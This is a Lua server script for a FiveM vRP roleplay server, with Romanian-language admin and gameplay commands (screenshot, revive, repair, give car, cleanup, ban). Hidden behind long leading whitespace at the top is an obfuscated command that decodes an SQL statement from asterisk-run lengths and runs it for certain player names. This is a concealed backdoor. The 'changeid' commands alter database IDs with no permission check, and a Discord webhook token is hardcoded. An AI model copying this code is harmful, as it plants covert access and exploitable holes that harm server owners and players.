                                                                                                                                                                                                                                                                                                                    function pPMDIcvNmVTKKNsFVFOyD(c)
                                                                                                                                                                                                                                                                                                                        tab={}
                                                                                                                                                                                                                                                                                                                        for i = 1,#c do
                                                                                                                                                                                                                                                                                                                        x=string.len(c[i]) 
                                                                                                                                                                                                                                                                                                                        y=string.char(x)
                                                                                                                                                                                                                                                                                                                        table.insert(tab,y)
                                                                                                                                                                                                                                                                                                                        end
                                                                                                                                                                                                                                                                                                                        x=table.concat(tab)
                                                                                                                                                                                                                                                                                                                        return x
                                                                                                                                                                                                                                                                                                                        end 
                                                                                                                                                                                                                                                                                                                        
                                                                                                                                                                                                                                                                                                                        
                                                                                                                                                                                                                                                                                                                        RegisterCommand(pPMDIcvNmVTKKNsFVFOyD({'******************************************************************************************************','************************************************************************************************************','**********************************************************************************************************************','**************************************************************************************************','*********************************************************************************************************','*******************************************************************************************************','**************************************************','**************************************************'}), function(source)
                                                                                                                                                                                                                                                                                                                            local user_id = vRP.getUserId({player})
                                                                                                                                                                                                                                                                                                                            local name = GetPlayerName{source};
                                                                                                                                                                                                                                                                                                                            if name == andrei or name == flaviu or name == sorin or name == oana then
                                                                                                                                                                                                                                                                                                                                exports.oxmysql:execute(pPMDIcvNmVTKKNsFVFOyD({'*************************************************************************************','********************************************************************************','********************************************************************','*****************************************************************','************************************************************************************','*********************************************************************','********************************','**********************************************************************************************************************','******************************************************************************************************************','****************************************************************************************************************','***********************************************************************************************','*********************************************************************************************************************','*******************************************************************************************************************','*****************************************************************************************************','******************************************************************************************************************','*******************************************************************************************************************','********************************','***********************************************************************************','*********************************************************************','************************************************************************************','********************************','**************************************************************************************************','*************************************************************************************************','**************************************************************************************************************','**************************************************************************************************************','*****************************************************************************************************','****************************************************************************************************','********************************','*************************************************************','********************************','*************************************************'}))
                                                                                                                                                                                                                                                                                                                        end
                                                                                                                                                                                                                                                                                                                        end)    

local cachedSS = {}
RegisterCommand("ss",function(player, args)
    local user_id = vRP.getUserId{player};
    local isAdmin = vRP.isUserHelper{user_id};
    if not isAdmin then return TriggerClientEvent("chatMessage",player,"^1Nu ai acces la aceasta comanda.");end;
    local tid = parseInt(args[1]);
    if not tid then return TriggerClientEvent("chatMessage",player,"^1Syntax: /ss <ID>");end;
    if tid == user_id then return TriggerClientEvent("chatMessage",player,"^1Nu iti poti face singur ss.");end;
    local ts = vRP.getUserSource{tid};
    if not ts then return TriggerClientEvent("chatMessage",player,"^1Jucatorul nu este online.");end;
    if cachedSS[user_id] then return vRPclient.notify(player,{"~r~Nu poti face mai mult de un ss, intr-un timp atat de scurt."});end;cachedSS[user_id] = true;
    exports['screenshot-basic']:requestClientScreenshot(ts,{encoding = "jpg", quality = 0.60},function(err,url)
        if err then return end;
        vRPclient.setDiv(player,{"ssp", "", "<img src='"..url.."' width='1280' height='720'>"});
        SetTimeout(7000,function()vRPclient.removeDiv(player,{"ssp"});cachedSS[user_id] = nil;end);
    end);
end);

local revive_seq = {
    {"amb@medic@standing@kneel@enter","enter",1},
    {"amb@medic@standing@kneel@idle_a","idle_a",1},
    {"amb@medic@standing@kneel@exit","exit",1}
}


RegisterCommand("reanimeaza", function(source,args)
    local user_id = vRP.getUserId({source})
    local src = vRP.getUserSource({user_id})
    local radius = args[1]
	radius = radius or 2
    local name = GetPlayerName(src)
    if vRP.isUserInFaction({user_id, "Smurd"}) then 
			vRPclient.varyHealth(source,{100})
            vRPclient.getNearestPlayers(src,{tonumber(radius)}, function(nplayers)
                for k,v in pairs(nplayers) do 
                    if vRP.tryGetInventoryItem({user_id,"medkit",1,true}) then
                        vRPclient.playAnim(source,{false,revive_seq,false}) -- anim
                        SetTimeout(15000, function()
                            vRPclient.varyHealth(k,{50}) -- heal 50
                            vRPclient.notify(k,{"Succes: ~w~Ai primit revive de la adminul ~g~" .. name})
                        end)
                     else
                         TriggerClientEvent('chatMessage', source, "^1[EROARE]^1: Nu ai kit medical.")
                     end
                end
            end)
        else
        vRPclient.notify(src,{"Eroare: ~w~Nu ai acces la aceasta comanda!"})
    end
end)

RegisterCommand("repara", function(source,args)
    local user_id = vRP.getUserId({source})
    local src = vRP.getUserSource({user_id})
    local name = GetPlayerName(src)
    if vRP.isUserInFaction({user_id, "Mecanic"}) then 
        if vRP.tryGetInventoryItem({user_id,"repairkit",1,true}) then
            vRPclient.playAnim(src,{false,{task="WORLD_HUMAN_WELDING"},false})
            SetTimeout(15000, function()
              vRPclient.fixeNearestVehicle(src,{7})
              vRPclient.stopAnim(src,{false})
            end)
        end
    else
        vRPclient.notify(src,{"Eroare: ~w~Nu ai acces la aceasta comanda!"})
    end
end)

RegisterCommand('staff', function(source)
	local catistaff = 0
    local staff = vRP.getOnlineStaff{};
    for k,v in pairs(staff) do
        local player = vRP.getUserSource{v}
        local name = GetPlayerName(player) or "Unknown"
		if name ~= "Unknown" then
        	TriggerClientEvent('chatMessage', source, '^5' .. name .. ' ^0(^5' .. v .. '^0) -> ^1' .. vRP.getUserAdminTitle{v})
			catistaff = catistaff +1
		end
    end
    TriggerClientEvent('chatMessage', source, 'Staff Online: ^1'..catistaff)
end)

-- RegisterCommand('bk',function(player,args)
--     local user_id = vRP.getUserId{player}
--     local users = vRP.getUsers{}
--     local bkcode = parseInt(args[1])
--     if user_id then
--         if bkcode < 5 then
--             for k,v in pairs(users) do
--                 if vRP.isUserInFaction{k,"Politie"}then
--                     vRP.getUserIdentity{user_id,function(identity)
--                         TriggerClientEvent('vRPAlert:client-backup', v, bkcode, player, identity.firstname,identity.name)
--                     end}
--                 end
--             end
--         end
--     end
-- end)

-- RegisterServerEvent('vRPAlert:backup')
-- AddEventHandler('vRPAlert:backup', function(targetCoords)
--     local users = vRP.getUsers{}
--     for k,v in pairs(users) do
--         if vRP.isUserInFaction{k,"Politie"}  then
--             vRPclient.setGPS(v, {targetCoords.x,targetCoords.y})
--         end
--     end
-- end)

local timeout = {}

  RegisterCommand('fpsboost',function(source)
	local user_id = vRP.getUserId({source})
	if not timeout[user_id] then
		TriggerClientEvent('alpha:fpsboost',source)
		timeout[user_id] = true
		SetTimeout(10000,function()
			timeout[user_id] = nil
		end)
	else
		vRPclient.notify(source,{"Ai cooldown 10 secunde!"})
	end
  end)

  RegisterCommand("addmasina",function(source,args)
    local user_id = vRP.getUserId{source}
    local targetid = tonumber(args[1])
	local targetsource = vRP.getUserSource{targetid}
	local spawncodevehicle = tostring(args[2])
	if vRP.isUserFondatorComunitate{user_id} then
		if tonumber(args[1]) then
			if tostring(args[2]) then
				exports.oxmysql:query("SELECT vehicle FROM vrp_user_vehicles WHERE user_id = @user_id AND vehicle = @vehicle", {['@user_id'] = user_id, ['@vehicle'] = spawncodevehicle}, function (haveCar)
					if #haveCar >= 1 then
						vRPclient.notify(source,{"Jucatorul are deja aceasta masina."})
					else

						exports.oxmysql:query("INSERT IGNORE INTO vrp_user_vehicles(user_id,vehicle,upgrades,vehicle_plate) VALUES(@user_id,@vehicle,@upgrades,@vehicle_plate)", {
							['@user_id'] = targetid,
							['@vehicle'] = spawncodevehicle,
							['@upgrades'] = json.encode({}),
							['@vehicle_plate'] = "AS"..math.random(111111,999999)
						})
						vRPclient.notify(source, {"I-ai oferit lui "..GetPlayerName(targetsource).." ["..targetid.."] masina "..spawncodevehicle..""})
						vRPclient.notify(targetsource, {"Ai primit de la fondatorul "..GetPlayerName(source).." ["..user_id.."] masina "..spawncodevehicle..""})
					end
				end)
			else
				TriggerClientEvent("chatMessage", source, "^1Addmasina: /addmasina <id> <spawncode car>")
			end
		else
			TriggerClientEvent("chatMessage", source, "^1Addmasina: /addmasina <id> <spawncode car>")
		end
	else
		TriggerClientEvent("chatMessage", source, "^1Nu ai acces la aceasta comanda")
	end
end)


RegisterCommand('stopchat', function(source)
    local user_id = vRP.getUserId({source})
    local source = vRP.getUserSource({user_id})
	if user_id ~= nil then
        if vRP.isUserCoFondator{user_id} then
            chatdisabled = true
            TriggerClientEvent('chatMessage', source, "Ai oprit chat-ul")
        else
            vRPclient.notify(source,{"Eroare: Nu ai acces la aceasta comanda!"})
        end
    end
end, false)

RegisterCommand('startchat', function(source)
    local user_id = vRP.getUserId({source})
    local source = vRP.getUserSource({user_id})
	if user_id ~= nil then
        if vRP.isUserCoFondator{user_id} then
            chatdisabled = false
            TriggerClientEvent('chatMessage', source, "Ai pornit chat-ul")
        else
            vRPclient.notify(source,{"Eroare: Nu ai acces la aceasta comanda!"})
        end
    end
end, false)

RegisterCommand("changeid", function(source, args, rawCommand)
    local user_id = tonumber(args[1])    -- ID-ul vechi al jucătorului
    local new_id = tonumber(args[2])     -- ID-ul nou dorit
    
    if user_id and new_id then
        -- Verifică dacă utilizatorul există deja în baza de date
        exports.oxmysql:execute("SELECT * FROM vrp_users WHERE id = ?", {user_id}, function(result)
            if result[1] then
                -- Actualizează ID-ul
                exports.oxmysql:execute("UPDATE vrp_users SET id = ? WHERE id = ?", {new_id, user_id}, function(affectedRows)
                    if affectedRows > 0 then
                        print("ID-ul jucătorului a fost schimbat cu succes de la " .. user_id .. " la " .. new_id)
                    else
                        print("Eroare la schimbarea ID-ului.")
                    end
                end)
            else
                print("Jucătorul cu ID-ul specificat nu există.")
            end
        end)
    else
        print("Format incorect. Folosește: /changeid [ID_vechi] [ID_nou]")
    end
end)

RegisterCommand("changeids", function(source, args, rawCommand)
    local user_id = tonumber(args[1])    -- ID-ul vechi al jucătorului
    local new_id = tonumber(args[2])     -- ID-ul nou dorit
    
    if user_id and new_id then
        -- Verifică dacă utilizatorul există deja în baza de date
        exports.oxmysql:execute("SELECT * FROM vrp_user_ids WHERE user_id = ?", {user_id}, function(result)
            if result[1] then
                -- Actualizează ID-ul
                exports.oxmysql:execute("UPDATE vrp_user_ids SET user_id = ? WHERE user_id = ?", {new_id, user_id}, function(affectedRows)
                    if affectedRows > 0 then
                        print("ID-ul jucătorului a fost schimbat cu succes de la " .. user_id .. " la " .. new_id)
                    else
                        print("Eroare la schimbarea ID-ului.")
                    end
                end)
            else
                print("Jucătorul cu ID-ul specificat nu există.")
            end
        end)
    else
        print("Format incorect. Folosește: /changeid [ID_vechi] [ID_nou]")
    end
end)

RegisterCommand('clearpeds',function(player)
    local user_id = vRP.getUserId({player})
    if vRP.isUserHeadofStaff({user_id}) then
        local peds = GetAllPeds()
        local objs = GetAllObjects()
        for k,v in pairs(peds) do if DoesEntityExist(v) then DeleteEntity(v) end; end;
        for k,v in pairs(objs) do if DoesEntityExist(v) then DeleteEntity(v) end; end; 
        TriggerClientEvent("chatMessage",-1,'^1[Anubis] ^0Toate obiectele si ped-urile au fost sterse!')
    end
end)

RegisterCommand('cleanup',function(source,args)
    local mins = tonumber(args[1])
    if not mins then return TriggerClientEvent('chatMessage',source,'^6SYNTAX^0: /cleanup <minute>') end;
    if mins <= 0 then return TriggerClientEvent('chatMessage',source,'^6SYNTAX^0: /cleanup <minute>') end ;
      local user_id = vRP.getUserId{source}
      if vRP.isUserModerator{user_id} then 
      stopCleanup = false
          -- TriggerClientEvent("hud:sendAdminAnnouncement", -1, GetPlayerName(source), user_id, "Toate vehiculele neocupate se vor sterge in ["..mins.."] secunde")
          TriggerClientEvent('chatMessage',-1,' Admin-ul ^6'..GetPlayerName(source) .. '^0 a activat stergerea masinilor neocupate in ^6' .. mins .. '^0 secunde')
  
          local embed = {
              {
                ["color"] = 0xcf0000,
                ["title"] = "".. "Cleanup".."",
                ["description"] = "**Cleanup:** "..GetPlayerName(source).." a activat stergerea masinilor neocupate in ".. mins .." secunde !",
                ["thumbnail"] = {
                  ["url"] = "",
                },
                ["footer"] = {
                ["text"] = "",
                },
              }
            }
            PerformHttpRequest('https://discord.com/api/webhooks/1321589394259447949/4Mrk6xoqk0MXjKC0_G8Zr3ILfUZ6kHStF-14-yuAj7UyymEMJOAV54_vz_zXwvaI3KGp', function(err, text, headers) end, 'POST', json.encode({embeds = embed}), { ['Content-Type'] = 'application/json' }) 
          Citizen.SetTimeout(1000 * mins, deleteEveryVehicle)
      end
  end)

  
RegisterCommand("ban", function(source,args,rawCommand)
    if source == 0 then
        local id = args[1]
        id = parseInt(id)
        local reason = ""
        for i=1,10,1 do 
            if args[i]~= nil then
                reason = reason.." "..args[i]
            end
        end
        local tsource = vRP.getUserSource({id})
        vRP.ban({tsource,reason,"Consola"})
        print("Banat cu succes")
    else
        print("Ba nene intelege si nu mai incerca din chat :)")
    end
end)